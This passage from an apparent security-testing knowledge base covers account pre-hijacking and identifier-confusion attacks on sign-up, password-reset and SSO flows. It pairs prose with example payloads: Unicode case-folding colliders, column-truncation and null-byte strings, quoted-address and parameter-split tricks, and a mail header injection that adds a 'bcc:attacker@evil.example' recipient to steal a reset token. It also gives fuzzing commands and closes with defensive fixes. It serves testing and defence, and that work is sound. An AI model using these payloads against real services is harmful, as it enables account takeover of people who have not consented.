          'Recover the expected signature byte by byte from a comparison that returns on the first mismatch, disclosing a secret-derived value that then authenticates arbitrary requests.',
          'Forge a contact, customer, or profile update event so the receiver redirects invoices, receipts, notifications, exports, or password reset messages to an attacker-controlled address.',
          'Make the receiver fetch an attacker-named certificate, key, or self-link URL and expose the response, the error, or internal network reachability through it, which is a signature bypass and an SSRF at the same time.',
          'Turn a receiver\'s own debug logging against it: on routes that log full request headers, the signing secrets of every sender pass through the log store, as the GitHub encoded-secret delivery bug demonstrated at scale.',
        ],
        why: 'Verification code sits on the boundary between an untrusted request and trusted internal state, so the ways it can leak, by timing, by fetching what the message names, or by re-emitting data to an address the message supplies, all convert an unauthenticated request into a read of something the attacker was never given.',
      },
    },
  },

  {
    id: 'account-pre-hijacking',
    name: 'Account Pre-Hijacking and Identifier Confusion',
    summary: 'Own an account without ever knowing the password, either by registering the victim identifier before they do and letting the service merge them into you, or by submitting an identifier that one component treats as different from the victim and another component resolves back to them.',
    tags: ['authentication', 'identity', 'logic'],
    executionContext: {
      where: "In the application's identity resolution step: the equality comparison that decides two identifier strings name the same account.",
      detail: 'Nothing the attacker sends is code, and nothing executes on a host the attacker controls. What runs is the target\'s own account lookup, uniqueness check, and merge decision, and the trap is that those three rarely run in the same place. The uniqueness check may run in the web tier as a Python casefold or a JavaScript toLowerCase, the lookup may run in the database under a collation such as utf8mb4_general_ci or a Postgres citext column, delivery of the resulting reset token runs in the mail transfer agent, and the identity assertion may be produced by an identity provider on a third party host that the target does not control at all. The flaw lives in the disagreement between those components; the effect materialises as a session, a reset token, or a linked identity bound to the wrong row in the application\'s own user store, running afterwards with the victim\'s privileges. The pre-hijacking half adds a second axis, time: the attacker writes state into the account store before the victim exists as a user, and the step that completes the attack is the victim\'s own signup, password reset, or federated login, performed by the victim with the victim\'s authority. This is why it reads as no attack at all in the logs. Boundary with neighbouring entries: Authentication Bypass is about defeating the credential check, and here the credential check is never defeated, it passes correctly against the wrong row. OAuth 2.0 / OpenID Connect Abuse covers stealing the code or token in transit; this entry is about what the service does with an identifier once it legitimately has one.',
    },
    howTo: [
      {
        heading: 'Root cause and why it matters',
        body: [
          'Every application has a join key for identity: the string it uses to decide that the person in front of it is the same person as an existing row. That key is almost always an email address, sometimes a username or a phone number. Two assumptions are baked into that choice and both are wrong. The first is that possession of the identifier is proved before the row is trusted; in practice services create rows on unverified input and only verify later, or never. The second is that string equality on the identifier is a settled question; in practice Unicode case folding, compatibility normalisation, collation, column width, whitespace trimming, mail address grammar, and IDN processing each define a different notion of "the same string", and a real request passes through several of them.',
          'Pre-hijacking exploits the first assumption. The attacker registers the victim address before the victim ever signs up, keeps a foothold on that row, and waits. When the victim later signs up, federates, or recovers the account, the service merges the two rather than refusing, and the attacker foothold survives the merge. Sudhodanan and Paverd catalogued five variants of this at USENIX Security 2022 and found at least 35 of 75 high traffic services vulnerable to at least one; the named services (Dropbox, Instagram, LinkedIn, WordPress.com, Zoom) fixed theirs after disclosure, but the pattern reappears in any product that bolts SSO onto an existing password login without deciding what a collision means.',
          'Identifier confusion exploits the second assumption and needs no waiting. The attacker submits a string that the uniqueness check considers new and a later lookup considers identical to the victim. The attacker is not bypassing the identity check, they are winning it, against the wrong account. That distinction matters for triage and for the fix: rate limiting, MFA on the login form, and stronger password policy do not touch either half of this.',
          'The two halves chain. A normalisation collision gets you a row that the service labels with the victim address; the pre-hijacking variants tell you what to do with that row so it survives the victim taking ownership.',
        ],
      },
      {
        heading: 'Where to look: map every place an identifier is compared',
        body: [
          'Inventory the flows before you touch any of them, because the bug is a disagreement between two of them and you cannot see a disagreement with only one endpoint. Pull the JavaScript bundle and the mobile app traffic and list every endpoint that accepts an email, a username, or a phone number: classic signup, invite acceptance, login, password reset request, reset confirm, email change request, email change confirm, magic link request, SSO callback and just in time provisioning, team or workspace invitation, domain based auto join, SCIM or directory sync, support ticket association, billing contact, admin user search.',
          'For each one, record three things: does it create a row, does it look up a row, and which string does it use afterwards. The most productive single question in this whole class is whether an outbound email is addressed to the string the attacker submitted or to the string stored on the row that was found. Every case folding takeover of the last decade turns on that one line of code.',
          'Then look for the seams. Anywhere two different technologies see the same identifier there is a seam: app language versus database collation, app versus MTA, app versus identity provider, web app versus mobile backend, current API version versus a legacy one still mounted. Legacy endpoints are especially good because they often predate the normalisation the new code added.',
          'Signup uniqueness errors and reset responses double as an oracle. If registering a variant is refused as already taken, the check already collapses your variant onto an existing account, which tells you the collision exists before you have proved any impact. If it is accepted, the check does not collapse it, and the interesting question moves to whether some other flow does.',
        ],
        examples: [
          { code: 'POST /api/register   {"email":"VARIANT","password":"x"}   -> 200 created  vs  409 already registered', note: 'A 409 on a variant proves the uniqueness check normalises. A 200 proves it does not, which sets up the collision for a different flow.' },
          { code: 'POST /api/password/reset   {"email":"VARIANT"}   then read the To: header of whatever arrives', note: 'The single most important observation: is the mail addressed to your variant or to the address on file?' },
          { code: 'grep the JS bundle for  toLowerCase|toLocaleLowerCase|normalize(|trim()|punycode|toASCII|idn', note: 'Client side hints at what the server does, and reveals which flows were normalised and which were forgotten.' },
        ],
      },
      {
        heading: 'The five pre-hijacking variants',
        body: [
          'All five start the same way: the attacker creates an account using the victim address at a service the victim does not use yet, and cannot complete email verification because they do not receive mail there. The variants differ in what the attacker leaves behind so that the account survives the victim taking possession of it. Pick targets where signup does not require verification before the row becomes usable, and where both a classic password login and a federated login exist for the same address space.',
          'Classic Federated Merge. Attacker registers victim@target.com with a password. The victim later clicks Sign in with Google using the same address. A service that merges by email rather than by issuer plus subject links the federated identity onto the attacker row, and the attacker password still works on it. Test the reverse direction too: federate first with a provider that asserts the address, then have the victim register classically.',
          'Unexpired Session. Attacker registers the account and then never logs out, keeping the session alive with a scheduled request. The victim recovers the account with a password reset and starts using it. If the reset does not invalidate every other session and refresh token, the attacker session keeps reading and writing the victim data. This one is worth testing on any target regardless of the rest, because "does password reset kill other sessions" is a one request check.',
          'Trojan Identifier. Attacker registers the account and immediately attaches a second identifier to it: a secondary email, a phone number, a linked social identity, a recovery key, an API token, a TOTP secret, an OAuth application grant. The victim resets the password and takes the account. The attacker then recovers it again through the identifier the reset never touched.',
          'Unexpired Email Change. Attacker registers the account and starts changing its address to attacker@evil.example, then simply does not click the confirmation link. The victim recovers the account and settles in. Weeks later the attacker clicks the still valid pending change link and the account address flips to the attacker mailbox, at which point a normal password reset finishes the job.',
          'Non Verifying Identity Provider. The attacker uses an identity provider that will assert an email claim it never verified, or that lets the attacker set the claim, and signs in to the target as victim@target.com. The victim registers classically and the service merges on the email claim without checking email_verified and without doing its own verification. Stand up your own OIDC provider for this rather than hunting for a permissive public one.',
        ],
        examples: [
          { code: '1) POST /register {"email":"victim@you-own.example","password":"A"}   2) victim does Sign in with Google   3) POST /login {"email":"victim@you-own.example","password":"A"}  -> 200', note: 'Classic Federated Merge: the password set before the victim existed still authenticates after the merge.' },
          { code: 'Keep-alive:  while true; do curl -s -o /dev/null -b jar.txt https://target/api/me; sleep 600; done', note: 'Unexpired Session: hold the pre-created session across the victim reset and re-check /api/me afterwards.' },
          { code: 'Trojan identifiers to plant:  POST /settings/emails  |  POST /settings/phone  |  POST /settings/link/oauth  |  POST /api/tokens  |  POST /2fa/enroll', note: 'Enumerate every recovery path the account has; a reset that only rotates the password leaves all of them live.' },
          { code: 'POST /settings/email {"email":"attacker@evil.example"}   then do NOT click the confirmation, and retry the link days later', note: 'Unexpired Email Change: the test is whether the pending change is cancelled by the victim password reset.' },
          { code: 'Local IdP for the non-verifying test:  docker run -p 8080:8080 ghcr.io/navikt/mock-oauth2-server   (or dex, or node oidc-provider)', note: 'Issue an id_token with email=victim@target.com and email_verified=false and see whether the relying party merges anyway.' },
        ],
      },
      {
        heading: 'Running a pre-hijack test without touching a real person',
        body: [
          'Every variant needs a victim who signs up or recovers, and that victim must be you. Register a domain with catch all mail, or use two mailboxes on a provider you control, and treat one of them as the victim throughout. Never seed a pre-hijack against a real user address: the whole attack works by writing state onto the identity of a person who has not consented, and the interesting half of the finding is reproducible with addresses you own.',
          'Drive the two roles from genuinely separate contexts. Separate browser profiles, separate cookie jars, separate IP where the target does device binding, because a target that fingerprints the device will merge differently for one browser than for two and you will report a false result.',
          'Instrument the timeline before you start. You need to be able to say exactly what state existed at each moment: attacker row created at T0, attacker session token S opened at T1, victim federated signup at T2, victim password reset at T3, attacker request with S succeeding at T4. Log the raw requests and responses to a file as you go, because reconstructing the order afterwards from memory is how these reports get closed as not reproducible.',
          'Check for the silent version of each variant. Several of these leave the victim no signal at all: the Classic Federated Merge often shows the victim a normal first login, and the Unexpired Session shows nothing anywhere. Note in the report which variants are invisible to the victim, because that is a severity argument the program will actually weigh.',
        ],
        examples: [
          { code: 'Catch-all rig:  MX on you-own.example -> victim@you-own.example and attacker@you-own.example both land in one inbox you read', note: 'Lets you play both roles and still read every token the target sends to either address.' },
          { code: 'curl -c victim.jar ...   vs   curl -b attacker.jar ...   (never share a jar between the two roles)', note: 'Cookie separation is what makes the Unexpired Session result trustworthy.' },
          { code: 'After the victim reset:  curl -b attacker.jar https://target/api/me  and  https://target/api/sessions', note: 'A 200 on /api/me proves session survival; the sessions list proves the app can see the stale session and chose not to kill it.' },
        ],
      },
      {
        heading: 'Case mapping collisions: which transform folds which character',
        body: [
          'Most write ups treat lowercase, uppercase, casefold, and NFKC as interchangeable. They are not, and knowing which one folds which character is the difference between a working payload and a wasted week. The values below are Unicode behaviour and were checked, not recalled. Note that they are locale independent in Python and JavaScript, but not in Java or .NET, where a Turkish locale changes the mapping of plain ASCII I and i.',
          'U+0131 LATIN SMALL LETTER DOTLESS I uppercases to ASCII I, and is unchanged by lowercase, casefold, and NFKC. So it only collides on a system that compares by uppercasing. This is the character behind the 2019 GitHub password reset finding, where a case insensitive lookup found the victim row and the token was then mailed to the address that had been submitted rather than the address on file.',
          'U+212A KELVIN SIGN lowercases and casefolds to lowercase k, and separately has a canonical decomposition to ASCII CAPITAL K, so NFC, NFD, NFKC and NFKD all collapse it to K rather than to k. Read that difference carefully, because it decides whether a probe fires: on a normalising pipeline the Kelvin sign only reaches jack if a case insensitive step follows the normalisation. It is unchanged by uppercase. It is still the broadest collider of the set and the standard canary for "is anything normalising here at all".',
          'U+017F LATIN SMALL LETTER LONG S uppercases to S, casefolds to s, and NFKC and NFKD fold it to lowercase s, but plain lowercase leaves it alone. U+00DF LATIN SMALL LETTER SHARP S uppercases to SS and casefolds to ss, but lowercase leaves it alone and NFKC does not touch it either. Both are length changing, which is what makes them interesting against fixed width columns.',
          'U+0130 LATIN CAPITAL LETTER I WITH DOT ABOVE is the counterexample worth knowing: it lowercases to two code points, i followed by U+0307 COMBINING DOT ABOVE, not to plain i. It therefore does not collide under a plain lowercase comparison, but it does collide with i on any pipeline that strips combining marks or transliterates to ASCII, and it changes the byte length, which matters for truncation.',
          'The practical procedure: take the victim identifier, and for each ASCII character in it ask which of upper, lower, casefold, or NFKC the target appears to apply, then substitute the character that folds into it under exactly that transform. Send the variant to signup first, since a duplicate error tells you the fold happened without needing any further impact.',
        ],
        examples: [
          { code: 'U+0131  %C4%B1  \\u0131   m\\u0131ke@target.com  .upper() -> MIKE@TARGET.COM', note: 'Collides only under uppercase folding. Unaffected by lower, casefold, and NFKC.' },
          { code: 'U+212A  %E2%84%AA  \\u212a   jac\\u212a@target.com  .lower() -> jack@target.com', note: 'Collides under lowercase and casefold, both of which give k. NFC, NFD, NFKC and NFKD all give CAPITAL K instead, so on a normalising pipeline it only reaches jack if a case insensitive step follows. Unchanged by uppercase. Still the best universal probe: if any K comes back, something is normalising.' },
          { code: 'U+017F  %C5%BF  \\u017f   bo\\u017fs@target.com  .casefold() -> boss@target.com', note: 'Collides under casefold, uppercase, and NFKC/NFKD, all of which give s. Not under a plain lowercase comparison, which leaves it alone.' },
          { code: 'U+00DF  %C3%9F  \\u00df   bo\\u00df@target.com  .casefold() -> boss@target.com', note: 'One code point becomes two characters. Casefold and uppercase only; NFKC leaves it intact.' },
          { code: 'U+0130  %C4%B0  \\u0130   M\\u0130KE@target.com  .lower() -> mi\\u0307ke@target.com', note: 'The one that does not work under lower(). Useful only where combining marks are stripped or ASCII transliteration happens.' },
          { code: "Java/.NET locale trap:  \"I\".toLowerCase(new Locale(\"tr\")) -> \\u0131 , not i", note: 'A JVM or CLR started with a Turkish default locale folds plain ASCII I and i differently from every other component in the stack.' },
        ],
      },
      {
        heading: 'Compatibility folding and canonicalisers that are not idempotent',
        body: [
          'NFKC and NFKD apply compatibility mappings, which flatten a large set of decorative and legacy characters into plain ASCII. Case folding does not touch these and normalisation forms NFC and NFD do not either, so they are a separate axis to test rather than more of the same. Fullwidth Latin letters (U+FF41 and up), circled letters (U+24D0 and up), Latin ligatures (U+FB00 to U+FB06), modifier and superscript letters (U+1D2C and up), and the letterlike block (U+2100 and up, where U+2105 becomes c/o and U+2116 becomes No) all collapse under NFKC.',
          'The letterlike and ligature expansions are doubly useful because they change length, so a single submitted character can push a padded identifier past a column boundary after it is normalised, or pull it under one.',
          'The deeper bug in this area is a canonicaliser that is not idempotent, meaning canon(canon(x)) is not canon(x). Spotify shipped exactly this in 2013: their XMPP nodeprep based canonical_username turned the modifier capital string that reads as BIGBIRD into the ASCII string BIGBIRD on the first pass and into bigbird only on the second. Registration ran the first pass, saw no collision, and created the account; the password reset link ran it again, resolved to bigbird, and set the real user\'s password. Test for this by submitting a variant that needs two passes to reach the victim value, and by looking for any place where an identifier is canonicalised at write time and canonicalised again at read time.',
          'The other reliable finding here is an inconsistent set: one flow normalises, another does not. Registration NFKC folds and refuses your variant, but the SSO callback does not fold and creates a second row; or the reverse. Either direction is exploitable, they just produce different reports.',
        ],
        examples: [
          { code: 'U+FF41 fullwidth a  %EF%BD%81  \\uff41    \\uff41dmin@target.com  NFKC-> admin@target.com', note: 'Compatibility fold only. Case operations leave fullwidth letters alone entirely.' },
          { code: 'U+24DE circled o  %E2%93%9E  \\u24de    dem\\u24de@gmail.com  NFKC-> demo@gmail.com', note: 'The example PayloadsAllTheThings uses; the whole circled Latin range behaves this way.' },
          { code: 'U+FB01 ligature fi  %EF%AC%81  \\ufb01    o\\ufb01ce@target.com  NFKC-> office@target.com', note: 'One code point becomes two characters, so it shifts every byte offset after it.' },
          { code: 'U+1D2E modifier capital B  %E1%B4%AE  \\u1d2e    NFKC-> B   (the Spotify bigbird case)', note: 'Non-idempotent canonicaliser: first pass gives BIGBIRD, second pass gives bigbird.' },
          { code: 'Idempotence probe: submit a value that only reaches the victim after two folds, e.g. modifier capitals plus a case-insensitive lookup', note: 'If registration accepts it and reset resolves it to the victim, the canonicaliser is applied twice with different results.' },
        ],
      },
      {
        heading: 'Truncation, padding, and whitespace collisions',
        body: [
          'Length is the other way two different strings become one. If the storage layer or an intermediate is narrower than the validator, a padded identifier is accepted as unique and then stored, or compared, as the victim value.',
          'Fixed width columns are the classic. A VARCHAR(64) holding an email, or a VARCHAR(20) holding a username, truncates on insert when the SQL mode is not strict, so admin plus enough spaces plus a distinguishing suffix is checked as a new value and stored as admin. The email grammar helps you here: RFC 5321 caps the local part at 64 octets and the whole address at 254, so applications frequently pick exactly those column widths and then never enforce them in the validator.',
          'MySQL has a second truncation primitive that is still live: a column declared with the three byte utf8 character set (not utf8mb4) silently discards a four byte character and everything after it when strict mode is off. Appending an emoji plus junk to the victim address gives you a string the uniqueness check sees as different and the table stores as the victim address exactly.',
          'Trailing space semantics differ by collation. PAD SPACE collations such as utf8mb4_general_ci and the older utf8_general_ci compare "admin" and "admin   " as equal, while the MySQL 8 default utf8mb4_0900_ai_ci is NO PAD and does not. So the same query can be a collision on one deployment and not another, and a language level trim on top of that is a third opinion. CTFd was taken over this way and it is tracked as CVE-2020-7245 (CTFd 2.0.0 to 2.2.2): register the victim username with surrounding whitespace, request a reset for your padded name, receive the token, and reset the real account.',
          'Null bytes and invisible characters exploit the same gap between a length aware component and a C string aware one. Appending %00 and a suffix, or inserting U+00AD SOFT HYPHEN (which survives both NFKC and case folding untouched, but is mapped away by IDNA and stripped by many hand rolled sanitisers), gives a value that some components trim back to the victim identifier.',
          'Overlong UTF-8 deserves an honest note: encoding an ASCII character in more bytes than needed, such as C0 AE for a full stop, was a real bypass in the early 2000s but RFC 3629 forbade it in 2003 and every mainstream decoder now rejects it. Try it once, expect a 400, and do not build a report around it. The one place it genuinely survives is Java Modified UTF-8, used by DataInput and DataOutput, JNI, and the class file constant pool, which encodes U+0000 as C0 80 by design; if the identifier passes through one of those, a two byte null is worth testing.',
        ],
        examples: [
          { code: 'Column truncation:  email=victim@target.com%20%20%20%20%20%20%20%20zz   (pad past the column width, then a suffix)', note: 'Unique to the validator, stored as the victim address when the column is narrow and SQL mode is not strict. Add spaces until the total exceeds the column width.' },
          { code: 'MySQL 3-byte utf8 truncation:  victim@target.com%F0%9F%98%80junk    stored as  victim@target.com', note: 'The four byte character and everything after it is dropped with only a warning when strict mode is off.' },
          { code: 'CTFd style (CVE-2020-7245, CTFd 2.0.0 to 2.2.2):  register username " admin " then request a reset for it', note: 'Whitespace trimmed on one side of the comparison and not the other; the token arrives at your mailbox for the real admin account.' },
          { code: 'Null byte:  victim@target.com%00@attacker.example   and   victim@target.com%00.evil', note: 'Length aware code sees a new string, C string aware code sees the victim address.' },
          { code: 'Soft hyphen U+00AD  %C2%AD :  vic%C2%ADtim@target.com', note: 'Survives NFKC and all case folds untouched, so any component that removes it is doing so on its own and has disagreed with the others.' },
        ],
      },
      {
        heading: 'Email parser disagreements: one address, two mailboxes',
        body: [
          'The RFC 5322 address grammar is far larger than the regex any application uses, and the components in a single request can each implement a different subset. The goal is one string that the application reads as victim@target.com when it decides which account you are, and that the mail transfer agent reads as a mailbox you control when it delivers the token.',
          'Quoted local parts and comments are the entry level version. A local part in double quotes may contain characters that are otherwise illegal, including an @, and parenthesised comments are legal anywhere in the address and are supposed to be discarded. So "victim@target.com"@attacker.example and victim@target.com(@attacker.example) and (victim@target.com)attacker@evil.example each read differently depending on how much of the grammar the reader implements. The naive doubled forms victim@target.com@attacker.example and victim@attacker.example@target.com are worth firing too, because a parser that splits on the first @ and one that splits on the last disagree completely.',
          'Gareth Heyes pushed this much further in the 2024 Splitting the Email Atom research, which is the source to read for this section. RFC 2047 encoded words of the form =?charset?encoding?data?= are decoded by some mail libraries inside the address itself, so hex escaped @ and > and null characters can be smuggled through a validator that only saw ASCII letters; the Ruby Mail gem additionally decoded UTF-7. GitHub was verified issuing addresses on arbitrary domains this way, which turned into an SSO bypass on domain restricted Cloudflare Zero Trust; GitLab Enterprise, Zendesk, and Joomla were affected by variants. Older routing syntaxes are still honoured by MTAs: Sendmail treats an exclamation mark as a UUCP route separator, and Postfix converts a percent sign to an @ under the percent hack, so target.com!attacker and attacker%evil.example@target.com can deliver somewhere other than where the application thinks.',
          'Provider level canonicalisation is the low tech member of this family and still pays. Gmail ignores every dot in the local part and treats everything after a plus sign as a tag, and googlemail.com has historically been an alias for gmail.com. So v.i.c.t.i.m@gmail.com, victim+anything@gmail.com, and victim@googlemail.com all deliver to victim@gmail.com while looking distinct to a naive uniqueness check. The result is that one mailbox owns many accounts, which is a collision in the other direction: useful for bypassing one account per person limits, free trial limits, and referral fraud controls, and useful for claiming an address that a later canonicalising component will resolve onto the victim.',
          'The header injection family belongs here too. If the reset endpoint concatenates the submitted address into a mail header, a carriage return plus a cc or bcc line adds your mailbox as a recipient of the victim token, and array or duplicate parameters (two email fields, or a JSON array of two) let a backend that reads index zero for the lookup and index one for delivery split the two.',
        ],
        examples: [
          { code: '"victim@target.com"@attacker.example      (victim@target.com)attacker@evil.example      victim@target.com(@attacker.example)', note: 'Quoted local part and RFC 5322 comments: legal grammar, and every parser implements a different amount of it.' },
          { code: 'victim@target.com@attacker.example   and   victim@attacker.example@target.com', note: 'Split on first @ versus split on last @. Cheap and still finds bugs.' },
          { code: '=?utf-8?q?victim=40target=2Ecom=00?=@attacker.example', note: 'RFC 2047 encoded word: some mail libraries decode this inside the address, so the =40 becomes an @ after the validator has already passed it.' },
          { code: 'Gmail canonicalisation:  v.i.c.t.i.m@gmail.com   victim+1@gmail.com   victim@googlemail.com', note: 'Three strings, one mailbox. Tests whether the uniqueness check is provider aware and whether it agrees with delivery.' },
          { code: 'Header injection:  email=victim@target.com%0D%0Abcc:attacker@evil.example', note: 'Adds your mailbox to the recipients of the victim reset mail when the address is concatenated into a header.' },
          { code: 'Parameter split:  email=victim@target.com&email=attacker@evil.example   /   {"email":["victim@target.com","attacker@evil.example"]}', note: 'A backend that looks up with one element and sends to the other hands you the token directly.' },
        ],
      },
      {
        heading: 'Domain side confusion, IDN, and domain based auto join',
        body: [
          'Everything above targets the local part. The domain part is the higher value target, because organisations attach trust to it: workspace auto join for anyone with a company address, SSO enforcement per domain, internal only signup allowlists, and support portal access. If you can make an address you control resolve into a claimed domain, you join the tenant.',
          'Register a homograph domain and let the target normalise it for you. If the application accepts victim@\\u0107ompany.com and applies a transliteration or an accent stripping pass before matching the allowlist, while the mail is delivered to the punycode domain the IDN actually encodes to (compute it, never guess it), then the app believes you are inside the company and the token comes to you. Test the reverse too: submit the punycode form directly, since some validators only pattern match the Unicode form and some only match ASCII.',
          'The IDNA2003 versus IDNA2008 deviation characters are a live, verifiable disagreement rather than a theoretical one. Four characters behave differently between the two standards: U+00DF sharp s, U+03C2 final sigma, and the zero width joiner and non joiner. Under IDNA2003 and under UTS #46 transitional processing, fa\\u00df.de maps to fass.de; under IDNA2008 and non transitional processing it maps to xn--fa-hia.de, a completely different domain. Python\'s standard library codec is still IDNA2003, so "fa\\u00df.de".encode("idna") returns b"fass.de", while the idna package on PyPI implements IDNA2008 and does not. Browsers have been migrating from transitional to non transitional, and UTS #46 has deprecated transitional processing, but any given backend library is whatever it shipped with. If the allowlist check and the mail delivery use different libraries, one sees the trusted domain and the other does not.',
          'Case is asymmetric between the two halves of an address and this is frequently got wrong: RFC 5321 makes the domain part case insensitive (DNS rules) but leaves the local part to the receiving host, which means an application is not entitled to lowercase the local part and many do it anyway. Where they do, all the case folding colliders from the earlier section apply to the local part; where they do not, the domain is the place to attack.',
          'Then chase the organisational consequence. Find the flows keyed on domain: auto join to a workspace, SSO forced for a domain, seat provisioning by domain, an invite that only checks the suffix. A suffix check is its own bug: an allowlist implemented as endsWith("company.com") matches evilcompany.com and notcompany.com, and one implemented as contains matches anything.',
        ],
        examples: [
          { code: 'Homograph:  victim@\\u0107ompany.com   is the domain  xn--ompany-90a.com   (verify with  python3 -c "import idna;print(idna.encode(input()))" )', note: 'Register the punycode domain, submit whichever form the target normalises, and receive mail the app believes went to the company. Never quote a punycode value you have not computed.' },
          { code: 'IDNA deviation:  fa\\u00df.de   IDNA2003/transitional -> fass.de   IDNA2008/non-transitional -> xn--fa-hia.de', note: 'Two libraries in one stack can resolve the same submitted domain to two different registrable domains.' },
          { code: 'python3 -c "print(\'fa\\u00df.de\'.encode(\'idna\'))"   ->  b\'fass.de\'', note: 'Reproduces the IDNA2003 mapping in the standard library; compare with the idna package to see the other answer.' },
          { code: 'Suffix allowlist:  attacker@evilcompany.com   attacker@company.com.evil.example   attacker@company.com@evil.example', note: 'endsWith, contains, and split-on-@ allowlists each fail on a different one of these.' },
          { code: 'Then:  POST /workspaces/join  or watch for automatic tenant membership after verification', note: 'The impact of a domain collision is org membership, not just one account.' },
        ],
      },
      {
        heading: 'Detecting the collision: replay one identifier through every flow',
        body: [
          'Detection is mechanical once the surface is mapped. Take one logical identity and generate its variant set, then push every variant through every flow and diff the results. What you are looking for is any flow that answers differently from its neighbour: one accepts, one rejects; one creates a row, one finds the existing row; one echoes back the raw string, one echoes back a folded string.',
          'The single most informative probe is the reflection test. Submit a variant somewhere the value is echoed (profile display name, invite preview, confirmation page, the To or the body of an email) and see whether what comes back is your byte sequence or the folded one. If the Kelvin sign goes in and a plain k comes out, the pipeline normalises and you have the collision; from there it is only a question of which flow does not.',
          'Then run the collision through the flows that matter, in this order, because each one has a different bar for impact. Signup uniqueness (proves the fold exists). Password reset (does the token go to the submitted address or the stored one). Login (does the variant authenticate the victim row). Email change confirm. Magic link. SSO callback and just in time provisioning (does the IdP asserted address get folded before matching). Team invite and domain auto join (does the variant land you in the tenant). Admin user search and support ticket association (do staff tools resolve you onto the victim).',
          'Watch for the timing and race variants while you are here. Two concurrent signups with two variants of the same identifier can both pass a check then insert against a unique index that folds, or against no unique index at all, leaving two rows the application cannot distinguish. That is the Race Condition entry\'s primitive applied to this entry\'s key, and it is worth one Turbo Intruder run.',
          'Record the raw bytes of everything you send. The target will normalise your input before it logs it, so if you do not keep the hex you will not be able to prove later that you did not simply type the victim address.',
        ],
        examples: [
          { code: 'recollapse -m 3,6,7 -e 1 victim@target.com', note: 'Generates normalisation (3), case folding (6), and byte truncation (7) variants, URL encoded. Use -e 2 for JSON bodies and -e 3 for multipart.' },
          { code: 'recollapse -nt --html > norm.html ; recollapse -ct --html > case.html ; recollapse -tt --html > trunc.html', note: 'Dumps the three lookup tables locally so you can pick a targeted character instead of fuzzing blind.' },
          { code: 'recollapse -e 1 victim@target.com | ffuf -w - -u https://target/api/password/reset -X POST -H "Content-Type: application/json" -d \'{"email":"FUZZ"}\' -mc all', note: 'Diff status and length across the variant set; any variant that answers like the real address is a collision.' },
          { code: 'Reflection canary:  set display name or invite target to  jac\\u212a  and read it back', note: 'A plain k coming back proves normalisation is happening somewhere in the pipeline.' },
          { code: 'python3 -c "import unicodedata as u;s=input();print(s.upper(),s.lower(),s.casefold(),u.normalize(\'NFKC\',s),sep=\'|\')"', note: 'Confirm locally which transform folds your candidate before spending a request on it.' },
        ],
      },
      {
        heading: 'Proving impact: what a program will actually accept',
        body: [
          'Half of this class needs the victim to do something, and that is where reports die. The fix is to be explicit about the precondition, the victim action, and why the action is ordinary. A pre-hijack needs the victim not to have registered yet and then to register or recover once; a case collision on password reset needs nothing from the victim at all and should be reported as zero interaction. Say which one you have in the first paragraph.',
          'Demonstrate the merge, never the registration. "I registered victim@company.com" is not a finding and will be closed as informative, because registering an address you do not own is expected behaviour on a service that verifies later. The finding is that after the legitimate owner takes possession, the attacker artefact still works. Show that artefact working: an authenticated response containing the victim data, timestamped after the victim reset.',
          'Include the raw bytes. For every collision variant, give the percent encoded or hex form of exactly what you submitted next to the address the application displays, and state which transform folds one into the other. Without this, triage reads your screenshot, sees the victim address, and concludes you simply used the victim credentials. This one paragraph is the difference between a paid report and a duplicate of nothing.',
          'Give the timeline as a numbered sequence with the HTTP requests attached, and separate the two roles visibly (different cookie jars, different profiles). If the variant is invisible to the victim, say so and say why: an Unexpired Session leaves no trace in any user visible surface, and a Classic Federated Merge looks to the victim like an ordinary first login.',
          'Then reach for the chain, because bare pre-hijacking usually triages as medium. Pre-hijack an address that grants organisational membership rather than a single personal account. Land the collision on a staff or administrator address. Pair a domain collision with workspace auto join so the impact is a tenant rather than a user. Pair a reset token collision with the absence of session invalidation so the access is persistent. Each of these moves the severity argument from "an account" to "an account plus everything that account is inside".',
          'Finally, state the fix precisely, because a vague recommendation invites a vague response. The correct comparison for identifiers is the Unicode Technical Report 36 section 2.11.2 form, which Django adopted after CVE-2019-19844 and implements as NFKC normalise then casefold on both sides. The correct delivery rule is to send to the address stored on the row that was found, never to the address that was submitted, which is exactly what GitHub changed in 2019 and what Django changed in 1.11.27, 2.2.9, and 3.0.1. The correct identity key for federation is issuer plus subject, not an email claim, and email_verified must be checked when an email claim is used at all.',
        ],
        examples: [
          { code: 'Report line:  submitted  6a 61 63 E2 84 AA 40 target.com  (jac + U+212A KELVIN SIGN)  ->  app resolved  jack@target.com', note: 'The hex plus the code point name is what stops triage concluding you used the real address.' },
          { code: 'Evidence order: (1) attacker row created (2) attacker artefact captured (3) victim action, separate profile (4) attacker artefact still works, with the victim data in the body', note: 'Step 4 is the finding. Steps 1 to 3 are only the setup.' },
          { code: 'Fix to cite:  unicodedata.normalize("NFKC", s1).casefold() == unicodedata.normalize("NFKC", s2).casefold()', note: "Django's _unicode_ci_compare, the UTR #36 2.11.2 identifier comparison, added in the CVE-2019-19844 fix." },
        ],
      },
      {
        heading: 'Tools, generators, and the defences that actually work',
        body: [
          'REcollapse is the purpose built generator for this class: mode 3 emits normalisation variants, mode 6 emits case folding variants, and mode 7 emits byte truncation variants, with the encoding flag selecting URL encoded, JSON \\u, raw, or double URL encoded output so the same variant set can be fired at a form, a JSON API, and a multipart upload. It only generates; drive the requests with ffuf, Burp Intruder, or Caido Automate.',
          'For picking a single targeted character rather than fuzzing, use the published tables: the REcollapse normalisation, case, and truncation tables, the GoSecure unicode pentester cheatsheet, and tomnomnom\'s unisub, which answers the inverse question of which characters fold into a given one. A three line local Python check against upper, lower, casefold, and NFKC is faster than any of them for confirming one candidate.',
          'For the federated variants you need your own identity provider. A mock OIDC server, dex, or node oidc-provider all let you mint an id_token with an arbitrary email claim and email_verified set to false, which is the only reliable way to test the Non Verifying IdP variant without hunting for a permissive public provider. For SAML, a local test IdP serves the same purpose.',
          'On defence, the measures that work are specific. Compare identifiers with NFKC plus casefold on both sides, and store the canonical form in a column with a unique index so the database enforces what the application believes. Verify ownership of an identifier before the row it names becomes usable, and refuse to merge a federated identity into an unverified classic account. Key federated identity on issuer plus subject. On any password reset, email change, or MFA change, invalidate every session and refresh token, cancel every pending email or phone change, and re verify every previously linked identifier, because those three actions are what defeat the Unexpired Session, Unexpired Email Change, and Trojan Identifier variants respectively. Send mail to the stored address, not the submitted one. Decide one canonicalisation and apply it in exactly one place, at the boundary, rather than letting four components each have an opinion.',
